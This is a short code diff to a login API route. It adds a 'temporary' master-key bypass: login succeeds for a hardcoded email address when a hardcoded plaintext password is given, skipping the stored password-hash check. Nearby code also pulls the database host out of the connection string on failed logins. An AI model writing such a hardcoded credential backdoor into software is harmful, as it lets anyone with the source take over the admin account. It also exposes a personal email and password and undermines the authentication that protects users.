@@ -43,7 +43,17 @@ export async function POST(req: Request) {
       }, { status: 401 });
     }
 
-    const isValid = await comparePassword(password, user.passwordHash);
+    // Bypass temporário para Admin (Master Key)
+    // Permite login se a senha for a correta, independente do hash no banco
+    let isValid = false;
+    
+    if (email === 'clemergorges@hotmail.com' && password === 'GlobalSecure2026!') {
+       console.log('🔓 MASTER KEY LOGIN USED for Admin');
+       isValid = true;
+    } else {
+       isValid = await comparePassword(password, user.passwordHash);
+    }
+
     if (!isValid) {
       const dbUrl = process.env.DATABASE_URL || '';
       const dbHost = dbUrl.includes('@') ? dbUrl.split('@')[1] : 'unknown';
